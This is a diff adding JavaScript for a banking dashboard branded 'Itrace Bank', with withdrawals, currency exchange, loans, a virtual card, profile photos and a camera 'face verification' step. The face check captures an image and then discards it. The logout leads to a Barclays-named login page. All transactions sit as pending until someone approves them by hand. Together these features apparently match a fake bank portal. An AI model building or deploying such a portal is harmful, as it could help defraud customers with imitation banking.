+    rows = [['Method', method],['Bank', bank],['Account', bacc],['Routing', broute]];
+  }else{
+    method = 'Cash Pickup';
+    rows = [['Method', method],['Collect at','Itrace Bank Financial, 27 Gresham Street, London, EC2V 7HN, United Kingdom']];
+  }
+
+  /* balance changes only when the bank approves the request */
+  const st = stamp();
+  addTx({title:'Withdrawal · '+method, date:st.date, amount:fmt(amt), direction:'debit', status:'Pending', ref:st.ref});
+  submitRequest('withdrawal', {amount:amt, method:method, details:rows, ref:st.ref});
+
+  out.innerHTML = receiptHtml({
+    title:'Withdrawal Request Submitted', ref:st.ref, amount:fmt(amt),
+    rows: rows.concat([['Date & time', st.date],['New balance', C.balance]])
+  });
+
+  document.getElementById('wd-amt').value='';
+  toast('Withdrawal request submitted');
+}
+
+/* ---------- FACE VERIFICATION ---------- */
+let _pendingAction = null;
+let _stream = null;
+
+const FACE_THRESHOLD = 10000; // face verification applies to amounts of $10,000 or more
+
+// Decides whether a transaction needs face verification
+async function isFrozen(){
+  if(!window.DB || !C || !C.accNum) return false;
+  try{
+    const fresh = await window.DB.getCustomer(C.accNum);
+    if(fresh && fresh.status) C.status = fresh.status;
+    return !!fresh && fresh.status === 'Frozen';
+  }catch(e){ return false; }
+}
+function showFrozen(on){
+  const b = document.getElementById('frozenBanner');
+  if(b) b.style.display = on ? 'block' : 'none';
+}
+async function checkStatus(){
+  if(!window.DB){ setTimeout(checkStatus, 300); return; }
+  showFrozen(await isFrozen());
+}
+async function guard(kind){
+  if(await isFrozen()){
+    showFrozen(true);
+    toast('Your account is frozen. Transactions are not available.');
+    return;
+  }
+  const field = {transfer:'tr-amt', withdraw:'wd-amt', fx:'fx-amt'}[kind];
+  const amt = parseFloat(document.getElementById(field).value) || 0;
+  if(amt >= FACE_THRESHOLD){
+    secure(kind);
+    return;
+  }
+  // Below the threshold: process directly
+  if(kind === 'transfer') doTransfer();
+  else if(kind === 'withdraw') doWithdraw();
+  else if(kind === 'fx') doFx();
+}
+
+function secure(kind){
+  _pendingAction = kind;
+  document.getElementById('vf').style.display = 'flex';
+  document.getElementById('vf-cam').style.display = 'block';
+  document.getElementById('vf-ok').style.display = 'none';
+  document.getElementById('vf-msg').textContent = 'Starting camera…';
+  startCam();
+}
+
+function startCam(){
+  navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false})
+    .then(s => {
+      _stream = s;
+      document.getElementById('vf-video').srcObject = s;
+      document.getElementById('vf-capture').disabled = false;
+      document.getElementById('vf-msg').textContent = 'Look at the camera, then click Capture.';
+    })
+    .catch(() => {
+      document.getElementById('vf-capture').disabled = true;
+      document.getElementById('vf-msg').textContent = 'Camera not available. Allow camera access in your browser and try again.';
+    });
+}
+
+function stopCam(){
+  if(_stream){ _stream.getTracks().forEach(t => t.stop()); _stream = null; }
+}
+
+function captureFace(){
+  const v = document.getElementById('vf-video');
+  if(!v.videoWidth){ toast('Camera is not ready yet'); return; }
+  const c = document.getElementById('vf-canvas');
+  c.width = v.videoWidth; c.height = v.videoHeight;
+  c.getContext('2d').drawImage(v, 0, 0);
+  document.getElementById('vf-img').src = c.toDataURL('image/jpeg', 0.8);
+  stopCam();
+  document.getElementById('vf-cam').style.display = 'none';
+  document.getElementById('vf-ok').style.display = 'block';
+}
+
+function retakeFace(){
+  document.getElementById('vf-ok').style.display = 'none';
+  document.getElementById('vf-cam').style.display = 'block';
+  document.getElementById('vf-msg').textContent = 'Starting camera…';
+  startCam();
+}
+
+function confirmFace(){
+  const kind = _pendingAction;
+  closeVerify();
+  if(kind === 'transfer') doTransfer();
+  else if(kind === 'withdraw') doWithdraw();
+  else if(kind === 'fx') doFx();
+}
+
+function closeVerify(){
+  stopCam();
+  document.getElementById('vf').style.display = 'none';
+  _pendingAction = null;
+}
+
+/* ---------- CURRENCY EXCHANGE ---------- */
+const FX_RATES = {
+  EUR:{name:'Euro',rate:0.92}, GBP:{name:'British Pound',rate:0.79}, CAD:{name:'Canadian Dollar',rate:1.37},
+  AED:{name:'UAE Dirham',rate:3.67}, INR:{name:'Indian Rupee',rate:83.5}, NGN:{name:'Nigerian Naira',rate:1500},
+  GHS:{name:'Ghanaian Cedi',rate:15.5}, KES:{name:'Kenyan Shilling',rate:129}
+};
+const FX_MARGIN = 0.01; // 1% exchange margin
+
+function fxSetup(){
+  const sel = document.getElementById('fx-to');
+  if(sel && !sel.options.length){
+    sel.innerHTML = Object.keys(FX_RATES).map(c=>'<option value="'+c+'">'+c+' — '+FX_RATES[c].name+'</option>').join('');
+  }
+  const box = document.getElementById('fx-rates');
+  if(box && !box.innerHTML){
+    box.innerHTML = Object.keys(FX_RATES).map(c=>'<div class="rate"><small>USD → '+c+'</small><b>'+FX_RATES[c].rate.toLocaleString('en-US')+'</b></div>').join('');
+  }
+  fxPreview();
+}
+
+function fxPreview(){
+  const amt = parseFloat(document.getElementById('fx-amt').value) || 0;
+  const to = document.getElementById('fx-to').value;
+  const rate = FX_RATES[to] ? FX_RATES[to].rate * (1 - FX_MARGIN) : 0;
+  const bal = toNum(C ? C.balance : '0');
+  document.getElementById('fx-rate').textContent = rate ? (rate.toLocaleString('en-US',{maximumFractionDigits:4})+' '+to) : '—';
+  document.getElementById('fx-recv').textContent = amt && rate ? ((amt*rate).toLocaleString('en-US',{maximumFractionDigits:2})+' '+to) : '—';
+  document.getElementById('fx-after').textContent = amt ? fmt(bal - amt) : '—';
+}
+
+function doFx(){
+  const out = document.getElementById('fx-receipt');
+  out.innerHTML = '';
+  const to = document.getElementById('fx-to').value;
+  const amt = parseFloat(document.getElementById('fx-amt').value);
+  if(!amt || amt <= 0){ out.innerHTML='<div class="err">Enter the amount in USD you want to exchange.</div>'; return; }
+  const bal = toNum(C.balance);
+  if(amt > bal){ out.innerHTML='<div class="err">Insufficient funds. Your balance is '+C.balance+'.</div>'; return; }
+
+  const rate = FX_RATES[to].rate * (1 - FX_MARGIN);
+  const received = amt * rate;
+  /* balance changes only when the bank approves the request */
+  const st = stamp();
+  addTx({title:'Currency exchange · USD to '+to, date:st.date, amount:fmt(amt), direction:'debit', status:'Pending', ref:st.ref});
+  submitRequest('exchange', {amount:amt, currency:to, rate:rate, received:received, ref:st.ref});
+
+  out.innerHTML = receiptHtml({
+    title:'Exchange Request Submitted', ref:st.ref, amount:fmt(amt),
+    rows:[
+      ['Account', C.name + ' · ' + C.accNum],
+      ['Currency bought', FX_RATES[to].name + ' (' + to + ')'],
+      ['Rate applied', rate.toLocaleString('en-US',{maximumFractionDigits:4}) + ' ' + to + ' per USD'],
+      ['Amount received', received.toLocaleString('en-US',{maximumFractionDigits:2}) + ' ' + to],
+      ['Date & time', st.date],
+      ['New USD balance', C.balance]
+    ]
+  });
+  document.getElementById('fx-amt').value = '';
+  fxPreview();
+  toast('Exchange request submitted for approval');
+}
+
+/* ---------- LOANS ---------- */
+const LOAN_PRODUCTS = {
+  personal:{name:'Personal Loan', apr:8.99, min:1000,  max:50000, terms:[12,24,36,48,60]},
+  auto:    {name:'Auto Loan',     apr:6.49, min:5000,  max:80000, terms:[24,36,48,60,72]}
+};
+
+function pickLoan(key){
+  document.getElementById('ln-prod').value = key;
+  loanTerms(); loanCalc();
+  document.getElementById('ln-amt').scrollIntoView({behavior:'smooth',block:'center'});
+}
+
+function loanTerms(){
+  const p = LOAN_PRODUCTS[document.getElementById('ln-prod').value];
+  document.getElementById('ln-term').innerHTML = p.terms.map(t=>'<option value="'+t+'">'+t+' months</option>').join('');
+}
+
+function loanCalc(){
+  const p = LOAN_PRODUCTS[document.getElementById('ln-prod').value];
+  const P = parseFloat(document.getElementById('ln-amt').value) || 0;
+  const n = parseInt(document.getElementById('ln-term').value) || 0;
+  if(!P || !n){ ['ln-monthly','ln-interest','ln-total'].forEach(id=>document.getElementById(id).textContent='$0.00'); return; }
+  const r = p.apr/100/12;
+  const monthly = P * r / (1 - Math.pow(1+r, -n));
+  const total = monthly * n;
+  document.getElementById('ln-monthly').textContent = fmt(monthly);
+  document.getElementById('ln-interest').textContent = fmt(total - P);
+  document.getElementById('ln-total').textContent = fmt(total);
+}
+
+function loanApply(){
+  const out = document.getElementById('ln-result');
+  const errBox = document.getElementById('ln-err');
+  out.innerHTML=''; errBox.innerHTML='';
+  const key = document.getElementById('ln-prod').value;
+  const p = LOAN_PRODUCTS[key];
+  const amt = parseFloat(document.getElementById('ln-amt').value);
+  const term = parseInt(document.getElementById('ln-term').value);
+  const income = parseFloat(document.getElementById('ln-income').value);
+  const emp = document.getElementById('ln-emp').value;
+  const purpose = document.getElementById('ln-purpose').value.trim();
+
+  if(!amt || amt < p.min || amt > p.max){ errBox.innerHTML='<div class="err">'+p.name+' amounts range from '+fmt(p.min)+' to '+fmt(p.max)+'.</div>'; return; }
+  if(!income || income <= 0){ errBox.innerHTML='<div class="err">Please enter your annual income.</div>'; return; }
+  if(!purpose){ errBox.innerHTML='<div class="err">Please describe the purpose of the loan.</div>'; return; }
+
+  const r = p.apr/100/12;
+  const monthly = amt * r / (1 - Math.pow(1+r, -term));
+  const st = stamp();
+  const app = {ref:'LN'+Math.floor(100000+Math.random()*900000), product:p.name, amount:amt, term:term, apr:p.apr, monthly:monthly, income:income, employment:emp, purpose:purpose, date:st.date, status:'Under Review'};
+
+  submitRequest('loan', {product:p.name, amount:amt, term:term, apr:p.apr, monthly:monthly, income:income, employment:emp, purpose:purpose, ref:app.ref});
+
+  out.innerHTML = '<div class="info" style="margin-top:0.9rem"><b>Application '+app.ref+' received.</b><br/>We are reviewing it now. If approved, the funds will be paid into your account after final checks. Monthly payment if approved: <b>'+fmt(monthly)+'</b>.</div>';
+  ['ln-amt','ln-income','ln-purpose'].forEach(id=>document.getElementById(id).value='');
+  loanCalc(); renderLoans();
+  toast('Loan application submitted');
+}
+
+async function renderLoans(){
+  const box = document.getElementById('ln-list');
+  if(!box) return;
+  if(!window.DB){ box.innerHTML = '<div class="empty">Loading...</div>'; return; }
+  try{
+    const list = (await window.DB.listRequests(C.accNum)).filter(r => r.kind === 'loan');
+    box.innerHTML = list.length ? list.map(l =>
+      '<div class="ln-item"><div><b style="color:var(--navy)">' + l.product + ' · ' + fmt(Number(l.amount)) + '</b>'
+      + '<small>' + l.ref + ' · ' + l.term + ' months at ' + l.apr + '% APR</small></div>'
+      + '<span class="pill">' + (l.status === 'Pending' ? 'Under Review' : l.status) + '</span></div>'
+    ).join('') : '<div class="empty">No loan applications yet</div>';
+  }catch(e){
+    box.innerHTML = '<div class="empty">Could not load loans</div>';
+  }
+}
+
+/* ---------- MY CARD ---------- */
+async function renderCard(){
+  const box = document.getElementById('cardBox');
+  if(!box) return;
+  const card = C && C.card;
+  if(!card){
+    box.innerHTML = '<div class="card"><div class="info">Your card is being prepared. We will let you know when it is ready.</div></div>';
+    return;
+  }
+  const active = card.status === 'Active';
+  let requested = false;
+  try{
+    if(window.DB && !active){
+      const reqs = await window.DB.listRequests(C.accNum);
+      requested = reqs.some(r => r.kind === 'card' && r.status === 'Pending');
+    }
+  }catch(e){}
+  const action = active
+    ? '<span class="status-pill on">✓ Active</span>'
+    : requested
+      ? '<span class="status-pill off">Activation requested, awaiting review</span>'
+      : '<button class="btn-main" style="width:auto;padding:.7rem 1.2rem" onclick="requestCardActivation()">Activate card</button>';
+  box.innerHTML = '<div class="card" style="display:flex;gap:1.5rem;flex-wrap:wrap;align-items:center">'
+    + '<div class="virtual-card" style="flex:1;min-width:280px">'
+    +   '<div style="display:flex;justify-content:space-between;align-items:center"><div class="vc-chip"></div><div style="font-weight:800;letter-spacing:.08em">ITRACE</div></div>'
+    +   '<div class="vc-num">•••• •••• •••• ' + card.last4 + '</div>'
+    +   '<div class="vc-meta"><div>Card holder<b>' + (C.name || '').toUpperCase() + '</b></div><div>Expires<b>' + card.expiry + '</b></div></div>'
+    + '</div>'
+    + '<div style="flex:1;min-width:200px"><div style="font-size:.7rem;color:#6B7280;text-transform:uppercase;letter-spacing:.06em;margin-bottom:.4rem">Status</div>'
+    + action + '<div class="hint" style="margin-top:.8rem">Virtual debit card, linked to your USD balance.</div></div>'
+    + '</div>';
+  const h = document.getElementById('cd-holder'); if(h) h.textContent = (C.name || '').toUpperCase();
+  const e = document.getElementById('cd-expiry'); if(e) e.textContent = card.expiry;
+  const l = document.getElementById('cd-limit'); if(l) l.textContent = '$' + Number(card.limit || 5000).toLocaleString('en-US');
+}
+
+async function requestCardActivation(){
+  if(await isFrozen()){ showFrozen(true); toast('Your account is frozen. You cannot activate a card right now.'); return; }
+  const card = C.card || {};
+  await submitRequest('card', {action:'activate', last4: card.last4, ref: 'CRD' + Math.floor(100000 + Math.random()*900000)});
+  toast('Activation requested. We will review it shortly.');
+  renderCard();
+}
+
+/* ---------- MY PROFILE ---------- */
+function applyAvatar(photo){
+  const targets = [document.getElementById('topAv'), document.getElementById('sbAv'), document.getElementById('profAvatar')];
+  targets.forEach(el => {
+    if(!el) return;
+    if(photo){
+      el.style.backgroundImage = 'url(' + photo + ')';
+      el.classList.add('avatar-img');
+      el.textContent = '';
+    }else{
+      el.style.backgroundImage = '';
+      el.classList.remove('avatar-img');
+      el.textContent = (C && C.name) ? C.name.split(' ').map(n => n[0]).join('').toUpperCase() : '?';
+    }
+  });
+}
+
+function renderProfile(){
+  const set = (id, v) => { const el = document.getElementById(id); if(el) el.textContent = v || '—'; };
+  set('pr-name', C.name); set('pr-acc', C.accNum); set('pr-type', C.type);
+  set('pr-route', C.sortCode); set('pr-email', C.email); set('pr-joined', C.joined);
+  applyAvatar(C.photo);
+}
+
+function uploadProfilePhoto(input){
+  const file = input.files && input.files[0];
+  if(!file) return;
+  const url = URL.createObjectURL(file);
+  const img = new Image();
+  img.onload = () => {
+    const size = 240;
+    const canvas = document.createElement('canvas');
+    canvas.width = size; canvas.height = size;
+    const ctx = canvas.getContext('2d');
+    const m = Math.min(img.width, img.height);
+    ctx.drawImage(img, (img.width - m)/2, (img.height - m)/2, m, m, 0, 0, size, size);
+    URL.revokeObjectURL(url);
+    saveProfilePhoto(canvas.toDataURL('image/jpeg', 0.85));
+  };
+  img.onerror = () => toast('That file could not be opened. Please try another picture.');
+  img.src = url;
+}
+
+async function saveProfilePhoto(data){
+  if(!window.DB){ toast('Please wait a moment and try again.'); return; }
+  try{
+    await window.DB.setPhoto(C.accNum, data);
+    C.photo = data;
+    const s = JSON.stringify(C);
+    try{ sessionStorage.setItem('barc_customer', s); }catch(e){}
+    try{ localStorage.setItem('barc_customer', s); }catch(e){}
+    applyAvatar(data);
+    toast('Profile photo saved.');
+  }catch(e){
+    toast('Could not save the photo. ' + (e.code || e.message || ''));
+  }
+}
+
+/* ---------- LOAD THE LATEST DETAILS FROM THE DATABASE ---------- */
+async function refreshCustomer(){
+  if(!window.DB || !C || !C.accNum){ if(!window.DB) setTimeout(refreshCustomer, 300); return; }
+  try{
+    const fresh = await window.DB.getCustomer(C.accNum);
+    if(fresh){
+      C = Object.assign({}, C, fresh);
+      const s = JSON.stringify(C);
+      try{ sessionStorage.setItem('barc_customer', s); }catch(e){}
+      try{ localStorage.setItem('barc_customer', s); }catch(e){}
+      load();
+      renderProfile();
+      renderCard();
+    }
+  }catch(e){ console.error('Could not refresh customer', e); }
+}
+
+/* ---------- BANK APP (install to home screen) ---------- */
+let deferredInstall = null;
+window.addEventListener('beforeinstallprompt', e => {
+  e.preventDefault();
+  deferredInstall = e;
+  const c = document.getElementById('installCard');
+  if(c) c.style.display = 'block';
+});
+function installApp(){
+  if(!deferredInstall){
+    toast('To install: open your browser menu and choose "Install app" or "Add to Home Screen".');
+    return;
+  }
+  deferredInstall.prompt();
+  deferredInstall.userChoice.then(() => { deferredInstall = null; });
+}
+window.addEventListener('appinstalled', () => {
+  const c = document.getElementById('installCard');
+  if(c) c.style.display = 'none';
+  toast('Itrace Bank is now on your home screen.');
+});
+
+function logout(){
+  sessionStorage.removeItem('barc_customer');
+  localStorage.removeItem('barc_customer');
+  window.location.href='barclays-login.html';
+}
+
+function toast(msg){
+  const t = document.getElementById('toast');
+  t.textContent = msg; t.style.display='block';
+  clearTimeout(t._t); t._t = setTimeout(()=>t.style.display='none', 3500);
+}
+
+function refreshRemote(){
+  if(!C || !C.accNum) return;
+  if(!window.DB){ setTimeout(refreshRemote, 300); return; }
+  window.DB.listTransactions(C.accNum).then(list => {
+    window._remoteTx = list;
+    renderTx();
+  }).catch(e => console.error('Could not load transactions', e));
+}
+window.addEventListener('load', function(){ load(); refreshRemote(); checkStatus(); refreshCustomer(); });
+</script>
+<script type="module">
+import * as DB from './bank-db.js';
+window.DB = DB;
+</script>
+</body>
+</html>
